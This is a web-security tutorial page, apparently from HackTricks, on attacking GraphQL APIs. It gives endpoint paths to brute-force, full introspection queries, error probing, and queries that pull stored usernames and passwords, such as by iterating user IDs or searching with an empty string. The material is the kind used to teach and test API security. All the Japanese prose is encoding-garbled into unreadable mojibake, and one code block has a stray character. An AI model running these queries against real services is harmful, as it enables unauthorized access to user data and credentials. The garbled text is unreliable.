# GraphQL

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:

{% embed url="https://academy.8ksec.io/" %}

## Introduction

GraphQLã¯ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹ãŸã‚ã®ç°¡ç´ åŒ–ã•ã‚ŒãŸã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’æä¾›ã™ã‚‹**åŠ¹ç‡çš„ãªä»£æ›¿æ‰‹æ®µ**ã¨ã—ã¦**å¼·èª¿ã•ã‚Œã¦ã„ã¾ã™**ã€‚RESTã¯ã€ãƒ‡ãƒ¼ã‚¿ã‚’åé›†ã™ã‚‹ãŸã‚ã«ã•ã¾ã–ã¾ãªã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«å¯¾ã—ã¦å¤šæ•°ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¿…è¦ã¨ã™ã‚‹ã“ã¨ãŒå¤šã„ã®ã«å¯¾ã—ã€GraphQLã¯**å˜ä¸€ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã§å¿…è¦ãªã™ã¹ã¦ã®æƒ…å ±ã‚’å–å¾—ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã“ã®ç°¡ç´ åŒ–ã¯ã€ãƒ‡ãƒ¼ã‚¿å–å¾—ãƒ—ãƒ­ã‚»ã‚¹ã®è¤‡é›‘ã•ã‚’æ¸›å°‘ã•ã›ã‚‹ã“ã¨ã«ã‚ˆã‚Šã€**é–‹ç™ºè€…ã«å¤§ããªåˆ©ç›Šã‚’ã‚‚ãŸã‚‰ã—ã¾ã™**ã€‚

## GraphQLã¨ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£

GraphQLã‚’å«ã‚€æ–°ã—ã„æŠ€è¡“ã®ç™»å ´ã«ä¼´ã„ã€æ–°ã—ã„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã‚‚å‡ºç¾ã—ã¾ã™ã€‚é‡è¦ãªç‚¹ã¯ã€**GraphQLã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§èªè¨¼ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’å«ã¾ãªã„**ã¨ã„ã†ã“ã¨ã§ã™ã€‚é–‹ç™ºè€…ãŒãã®ã‚ˆã†ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’å®Ÿè£…ã™ã‚‹è²¬ä»»ãŒã‚ã‚Šã¾ã™ã€‚é©åˆ‡ãªèªè¨¼ãŒãªã„å ´åˆã€GraphQLã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯èªè¨¼ã•ã‚Œã¦ã„ãªã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ©Ÿå¯†æƒ…å ±ã‚’éœ²å‡ºã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ã‚’å¼•ãèµ·ã“ã—ã¾ã™ã€‚

### ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã¨GraphQL

éœ²å‡ºã—ãŸGraphQLã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã€ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã«ç‰¹å®šã®ãƒ‘ã‚¹ã‚’å«ã‚ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®ãƒ‘ã‚¹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

ã‚ªãƒ¼ãƒ—ãƒ³ãªGraphQLã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ã§ã€ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ã‚¯ã‚¨ãƒªã‚’èª¿æŸ»ã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’é€šã˜ã¦ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªãƒ‡ãƒ¼ã‚¿ã‚’ç†è§£ã™ã‚‹ãŸã‚ã«é‡è¦ã§ã™ã€‚GraphQLã®ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚·ã‚¹ãƒ†ãƒ ã¯ã€ã‚¹ã‚­ãƒ¼ãƒãŒã‚µãƒãƒ¼ãƒˆã™ã‚‹ã‚¯ã‚¨ãƒªã‚’è©³ç´°ã«ç¤ºã™ã“ã¨ã§ã“ã‚Œã‚’å®¹æ˜“ã«ã—ã¾ã™ã€‚ã“ã‚Œã«é–¢ã™ã‚‹è©³ç´°ã¯ã€ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã«é–¢ã™ã‚‹GraphQLã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š[**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### ãƒ•ã‚£ãƒ³ã‚¬ãƒ¼ãƒ—ãƒªãƒ³ãƒ†ã‚£ãƒ³ã‚°

ãƒ„ãƒ¼ãƒ«[**graphw00f**](https://github.com/dolevf/graphw00f)ã¯ã€ã‚µãƒ¼ãƒãƒ¼ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹GraphQLã‚¨ãƒ³ã‚¸ãƒ³ã‚’æ¤œå‡ºã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»äººã«å½¹ç«‹ã¤æƒ…å ±ã‚’å°åˆ·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

#### ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¯ã‚¨ãƒª <a href="#universal-queries" id="universal-queries"></a>

URLãŒGraphQLã‚µãƒ¼ãƒ“ã‚¹ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€**ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¯ã‚¨ãƒª** `query{__typename}` ã‚’é€ä¿¡ã§ãã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã« `{"data": {"__typename": "Query"}}` ãŒå«ã¾ã‚Œã¦ã„ã‚‹å ´åˆã€ãã®URLãŒGraphQLã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ãƒ›ã‚¹ãƒˆã—ã¦ã„ã‚‹ã“ã¨ãŒç¢ºèªã•ã‚Œã¾ã™ã€‚ã“ã®æ–¹æ³•ã¯ã€ã‚¯ã‚¨ãƒªã•ã‚ŒãŸã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¿ã‚¤ãƒ—ã‚’æ˜ã‚‰ã‹ã«ã™ã‚‹GraphQLã® `__typename` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã«ä¾å­˜ã—ã¦ã„ã¾ã™ã€‚
```javascript
query{__typename}
```
### åŸºæœ¬åˆ—æŒ™

Graphqlã¯é€šå¸¸ã€**GET**ã€**POST**ï¼ˆx-www-form-urlencodedï¼‰ãŠã‚ˆã³**POST**ï¼ˆjsonï¼‰ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ãŸã ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ãŸã‚ã«CSRFæ”»æ’ƒã‚’é˜²ããŸã‚ã«jsonã®ã¿ã‚’è¨±å¯ã™ã‚‹ã“ã¨ãŒæ¨å¥¨ã•ã‚Œã¾ã™ã€‚

#### ã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³

ã‚¹ã‚­ãƒ¼ãƒæƒ…å ±ã‚’ç™ºè¦‹ã™ã‚‹ãŸã‚ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€`__schema`ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’ã‚¯ã‚¨ãƒªã—ã¾ã™ã€‚ã“ã®ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¯ã™ã¹ã¦ã®ã‚¯ã‚¨ãƒªã®ãƒ«ãƒ¼ãƒˆã‚¿ã‚¤ãƒ—ã§åˆ©ç”¨å¯èƒ½ã§ã™ã€‚
```bash
query={__schema{types{name,fields{name}}}}
```
ã“ã®ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ã‚¿ã‚¤ãƒ—ã®åå‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

ã“ã®ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã™ã¹ã¦ã®ã‚¿ã‚¤ãƒ—ã€ãã®ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã€ãŠã‚ˆã³å¼•æ•°ï¼ˆãŠã‚ˆã³å¼•æ•°ã®ã‚¿ã‚¤ãƒ—ï¼‰ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ã‚¯ã‚¨ãƒªã™ã‚‹æ–¹æ³•ã‚’çŸ¥ã‚‹ã®ã«éå¸¸ã«å½¹ç«‹ã¡ã¾ã™ã€‚

![](<../../.gitbook/assets/image (950).png>)

**ã‚¨ãƒ©ãƒ¼**

**ã‚¨ãƒ©ãƒ¼**ãŒ**è¡¨ç¤º**ã•ã‚Œã‚‹ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã¯èˆˆå‘³æ·±ã„ã§ã™ã€‚ã“ã‚Œã¯æœ‰ç”¨ãª**æƒ…å ±**ã«è²¢çŒ®ã—ã¾ã™ã€‚
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (416).png>)

**ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚’ä»‹ã—ã¦ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚¹ã‚­ãƒ¼ãƒã‚’åˆ—æŒ™ã™ã‚‹**

{% hint style="info" %}
ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ãŒæœ‰åŠ¹ã§ã‚ã‚‹ãŒã€ä¸Šè¨˜ã®ã‚¯ã‚¨ãƒªãŒå®Ÿè¡Œã•ã‚Œãªã„å ´åˆã¯ã€ã‚¯ã‚¨ãƒªæ§‹é€ ã‹ã‚‰ `onOperation`ã€`onFragment`ã€ãŠã‚ˆã³ `onField` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã‚’å‰Šé™¤ã—ã¦ã¿ã¦ãã ã•ã„ã€‚
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
ã‚¤ãƒ³ãƒ©ã‚¤ãƒ³ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã‚¯ã‚¨ãƒª:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
æœ€å¾Œã®ã‚³ãƒ¼ãƒ‰è¡Œã¯ã€graphqlã‹ã‚‰ã™ã¹ã¦ã®ãƒ¡ã‚¿æƒ…å ±ï¼ˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆåã€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã€ã‚¿ã‚¤ãƒ—ãªã©ï¼‰ã‚’ãƒ€ãƒ³ãƒ—ã™ã‚‹graphqlã‚¯ã‚¨ãƒªã§ã™ã€‚

![](<../../.gitbook/assets/image (363).png>)

ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ãŒæœ‰åŠ¹ã«ãªã£ã¦ã„ã‚‹å ´åˆã€[**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)ã‚’ä½¿ç”¨ã—ã¦ã€GUIã§ã™ã¹ã¦ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’è¡¨ç¤ºã§ãã¾ã™ã€‚

### ã‚¯ã‚¨ãƒª

ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã©ã®ã‚ˆã†ãªæƒ…å ±ãŒä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã‹ãŒã‚ã‹ã£ãŸã®ã§ã€**ã„ãã¤ã‹ã®å€¤ã‚’æŠ½å‡ºã—ã¦ã¿ã¾ã—ã‚‡ã†**ã€‚

ã‚¤ãƒ³ãƒˆãƒ­ã‚¹ãƒšã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**ã©ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ç›´æ¥ã‚¯ã‚¨ãƒªã§ãã‚‹ã‹**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒå­˜åœ¨ã™ã‚‹ã‹ã‚‰ã¨ã„ã£ã¦ã‚¯ã‚¨ãƒªã§ãã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰ã€‚æ¬¡ã®ç”»åƒã§ã¯ã€"_queryType_"ãŒ"_Query_"ã¨å‘¼ã°ã‚Œã€"_Query_"ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®1ã¤ãŒ"_flags_"ã§ã‚ã‚Šã€ã“ã‚Œã¯ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ã‚¿ã‚¤ãƒ—ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒ•ãƒ©ã‚°ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚¯ã‚¨ãƒªã§ãã¾ã™ã€‚

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

ã‚¯ã‚¨ãƒª"_flags_"ã®ã‚¿ã‚¤ãƒ—ã¯"_Flags_"ã§ã‚ã‚Šã€ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯ä»¥ä¸‹ã®ã‚ˆã†ã«å®šç¾©ã•ã‚Œã¦ã„ã¾ã™ï¼š

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

"_Flags_"ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯**name**ã¨**value**ã§æ§‹æˆã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚æ¬¡ã«ã€ã‚¯ã‚¨ãƒªã‚’ä½¿ç”¨ã—ã¦ãƒ•ãƒ©ã‚°ã®ã™ã¹ã¦ã®åå‰ã¨å€¤ã‚’å–å¾—ã§ãã¾ã™ï¼š
```javascript
query={flags{name, value}}
```
æ³¨æ„ã—ã¦ãã ã•ã„ã€**ã‚¯ã‚¨ãƒªã™ã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆ**ãŒ**ãƒ—ãƒªãƒŸãƒ†ã‚£ãƒ–****ã‚¿ã‚¤ãƒ—**ï¼ˆä¾‹ãˆã°**æ–‡å­—åˆ—**ï¼‰ã®å ´åˆã€ä»¥ä¸‹ã®ä¾‹ã®ã‚ˆã†ã«

![](<../../.gitbook/assets/image (958).png>)

å˜ã«æ¬¡ã®ã‚ˆã†ã«ã‚¯ã‚¨ãƒªã§ãã¾ã™ï¼š
```javascript
query={hiddenFlags}
```
åˆ¥ã®ä¾‹ã§ã¯ã€"_Query_" ã‚¿ã‚¤ãƒ—ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸­ã« "_user_" ã¨ "_users_" ã® 2 ã¤ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒã‚ã‚Šã¾ã—ãŸã€‚\
ã“ã‚Œã‚‰ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒæ¤œç´¢ã«å¼•æ•°ã‚’å¿…è¦ã¨ã—ãªã„å ´åˆã€å¿…è¦ãªãƒ‡ãƒ¼ã‚¿ã‚’ **è¦æ±‚ã™ã‚‹** ã ã‘ã§ **ã™ã¹ã¦ã®æƒ…å ±ã‚’å–å¾—** ã§ãã¾ã™ã€‚ã“ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã®ä¾‹ã§ã¯ã€ä¿å­˜ã•ã‚ŒãŸãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŠ½å‡ºã§ãã¾ã™ï¼š

![](<../../.gitbook/assets/image (880).png>)

ã—ã‹ã—ã€ã“ã®ä¾‹ã§ã¯ãã†ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ã€æ¬¡ã® **ã‚¨ãƒ©ãƒ¼** ãŒç™ºç”Ÿã—ã¾ã™ï¼š

![](<../../.gitbook/assets/image (1042).png>)

ã©ã†ã‚„ã‚‰ã€"_**uid**_" å¼•æ•°ã®ã‚¿ã‚¤ãƒ— _**Int**_ ã‚’ä½¿ç”¨ã—ã¦æ¤œç´¢ã™ã‚‹ã‚ˆã†ã§ã™ã€‚\
ã¨ã«ã‹ãã€[Basic Enumeration](graphql.md#basic-enumeration) ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€å¿…è¦ãªæƒ…å ±ã‚’ã™ã¹ã¦è¡¨ç¤ºã™ã‚‹ã‚¯ã‚¨ãƒªãŒææ¡ˆã•ã‚Œã¦ã„ã¾ã—ãŸï¼š`query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

ãã®ã‚¯ã‚¨ãƒªã‚’å®Ÿè¡Œã—ãŸã¨ãã«æä¾›ã•ã‚ŒãŸç”»åƒã‚’èª­ã‚€ã¨ã€"_**user**_" ã«ã‚¿ã‚¤ãƒ— _Int_ ã® **arg** "_**uid**_" ãŒã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€è»½ã„ _**uid**_ ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã‚’å®Ÿè¡Œã—ãŸã¨ã“ã‚ã€_**uid**=**1** ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå–å¾—ã•ã‚Œã¾ã—ãŸï¼š\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

ç§ã¯ã€**ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿** "_**user**_" ã¨ "_**password**_" ã‚’è¦æ±‚ã§ãã‚‹ã“ã¨ã‚’ **ç™ºè¦‹** ã—ãŸã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ãªãœãªã‚‰ã€å­˜åœ¨ã—ãªã„ã‚‚ã®ã‚’æ¢ãã†ã¨ã™ã‚‹ã¨ (`query={user(uid:1){noExists}}`) ã“ã®ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã‹ã‚‰ã§ã™ï¼š

![](<../../.gitbook/assets/image (707).png>)

ãã—ã¦ã€**åˆ—æŒ™ãƒ•ã‚§ãƒ¼ã‚º**ã®é–“ã«ã€"_**dbuser**_" ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒ "_**user**_" ã¨ "_**password**_" ã‚’ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã¨ã—ã¦æŒã£ã¦ã„ã‚‹ã“ã¨ã‚’ç™ºè¦‹ã—ã¾ã—ãŸã€‚

**ã‚¯ã‚¨ãƒªæ–‡å­—åˆ—ãƒ€ãƒ³ãƒ—ãƒˆãƒªãƒƒã‚¯ï¼ˆ@BinaryShadow\_ ã«æ„Ÿè¬ï¼‰**

æ–‡å­—åˆ—ã‚¿ã‚¤ãƒ—ã§æ¤œç´¢ã§ãã‚‹å ´åˆã€ä¾‹ãˆã°ï¼š`query={theusers(description: ""){username,password}}` ã¨ã—ã€**ç©ºã®æ–‡å­—åˆ—**ã‚’ **æ¤œç´¢** ã™ã‚‹ã¨ã€ã™ã¹ã¦ã®ãƒ‡ãƒ¼ã‚¿ãŒ **ãƒ€ãƒ³ãƒ—** ã•ã‚Œã¾ã™ã€‚ (_ã“ã®ä¾‹ã¯ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã®ä¾‹ã¨ã¯é–¢ä¿‚ã‚ã‚Šã¾ã›ã‚“ã€‚ã“ã®ä¾‹ã§ã¯ã€"**theusers**" ã‚’ "**description**" ã¨ã„ã†æ–‡å­—åˆ—ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã§æ¤œç´¢ã§ãã‚‹ã¨ä»®å®šã—ã¦ãã ã•ã„_)ã€‚

### æ¤œç´¢

ã“ã®ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã§ã¯ã€**ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹**ã«ã¯ **äººç‰©** ã¨ **æ˜ ç”»** ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚**äººç‰©**ã¯ **ãƒ¡ãƒ¼ãƒ«** ã¨ **åå‰** ã§è­˜åˆ¥ã•ã‚Œã€**æ˜ ç”»**ã¯ **åå‰** ã¨ **è©•ä¾¡** ã§è­˜åˆ¥ã•ã‚Œã¾ã™ã€‚**äººç‰©**ã¯äº’ã„ã«å‹é”ã«ãªã£ãŸã‚Šã€æ˜ ç”»ã‚’æŒã£ãŸã‚Šã§ãã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹å†…ã®é–¢ä¿‚ã‚’ç¤ºã—ã¾ã™ã€‚

**åå‰** ã§äººç‰©ã‚’ **æ¤œç´¢** ã—ã€å½¼ã‚‰ã®ãƒ¡ãƒ¼ãƒ«ã‚’å–å¾—ã§ãã¾ã™ï¼š
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
ã‚ãªãŸã¯**åå‰**ã§äººã‚’**æ¤œç´¢**ã—ã€å½¼ã‚‰ã®**ç™»éŒ²**ã•ã‚ŒãŸ**æ˜ ç”»**ã‚’å–å¾—ã§ãã¾ã™:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
`subscribedMovies`ã®`name`ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚

åŒæ™‚ã«**è¤‡æ•°ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’æ¤œç´¢ã™ã‚‹**ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã“ã®å ´åˆã€2ã¤ã®æ˜ ç”»ã‚’æ¤œç´¢ã—ã¾ã™ï¼š
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
ã¾ãŸã¯**ã‚¨ã‚¤ãƒªã‚¢ã‚¹ã‚’ä½¿ç”¨ã—ãŸè¤‡æ•°ã®ç•°ãªã‚‹ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®é–¢ä¿‚**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutations

